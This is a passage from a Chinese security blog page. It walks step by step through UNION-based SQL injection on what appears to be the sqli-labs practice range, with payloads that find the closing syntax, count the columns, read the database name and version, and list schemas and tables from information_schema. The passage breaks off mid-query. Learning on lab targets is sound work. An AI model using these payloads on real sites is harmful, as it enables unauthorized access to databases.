-​     ？id=1’ 不正常  说明存在注入
-
-上图显示）附近有语法错误，所以构造语句的时候需要用）进行闭合
-1?id=1&#x27;) union select 1 --+
-
-
-上面图片显示列数不正确，盲猜试试三列
-2.判断字段数
-1?id=1&#x27;) union select 1,2,3 --+
-
-
-字段数为4时报错，说明字段数为3
-3.判断回显
-
-4.查看当前数据库和版本
-1?id=-1&#x27;) union select 1,database(),version() --+
-
-
-5.查看数据库名称
-1?id=-1&#x27;) union select 1，group_concat(schema_name),3 from information_schema.schemata --+
-
-
-6.查看security库里面的表名
-1?id=-1&#x27;) union select 1,group_concat(table_name),3 from information_schema.tables w ...</div></div></div><nav id="pagination"><div class="pagination"><span class="page-number current">1</span><a class="page-number" href="/page/2/#content-inner">2</a><a class="extend next" rel="next" href="/page/2/#content-inner"><i class="fas fa-chevron-right fa-fw"></i></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">aurora</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">16</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/" title="upload-labs靶场">upload-labs靶场</a><time datetime="2023-05-22T15:51:37.000Z" title="Created 2023-05-22 23:51:37">2023-05-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/05/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" title="文件上传">文件上传</a><time datetime="2023-05-21T13:30:40.000Z" title="Created 2023-05-21 21:30:40">2023-05-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/05/17/%E2%80%99%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E2%80%99/" title="宽字节注入">宽字节注入</a><time datetime="2023-05-17T15:44:46.000Z" title="Created 2023-05-17 23:44:46">2023-05-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/05/16/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/" title="堆叠注入">堆叠注入</a><time datetime="2023-05-16T11:54:24.000Z" title="Created 2023-05-16 19:54:24">2023-05-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/05/15/sql-labs%E9%9D%B6%E5%9C%BAless8/" title="sql-labs靶场less8(盲注)">sql-labs靶场less8(盲注)</a><time datetime="2023-05-15T01:59:31.000Z" title="Created 2023-05-15 09:59:31">2023-05-15</time></div></div></div></div><div class="card-widget card-archives"><div class="item-headline"><i class="fas fa-archive"></i><span>Archives</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/05/"><span class="card-archive-list-date">May 2023</span><span class="card-archive-list-count">16</span></a></li></ul></div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>Info</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">Article :</div><div class="item-count">16</div></div><div class="webinfo-item"><div class="item-name">UV :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">PV :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">Last Push :</div><div class="item-count" id="last-push-date" data-lastPushDate="2023-06-22T06:31:25.324Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By aurora</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
+  </div>
+</body>
+</html>
